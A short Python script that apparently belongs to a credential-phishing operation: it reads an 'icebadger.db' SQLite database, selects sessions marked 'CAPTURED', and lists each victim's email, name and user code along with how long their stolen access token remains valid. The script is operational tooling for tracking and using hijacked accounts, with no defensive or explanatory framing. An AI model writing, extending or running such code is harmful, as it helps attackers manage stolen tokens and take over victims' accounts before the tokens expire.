import sqlite3, json, time

conn = sqlite3.connect('icebadger.db')
conn.row_factory = sqlite3.Row
cur = conn.cursor()
rows = cur.execute('SELECT user_code, victim_name, victim_email, status, access_token_expiry, created_at, completed_at FROM sessions WHERE status = "CAPTURED"').fetchall()
print(f'Total CAPTURED sessions: {len(rows)}')
now = int(time.time())
for r in rows:
    exp = r['access_token_expiry'] or 0
    diff = exp - now
    hours = diff // 3600
    mins = (diff % 3600) // 60
    print(f"[{r['user_code']}] {r['victim_email']} ({r['victim_name']}) | expires_in={diff}s ({hours}h {mins}m) | status={r['status']}")
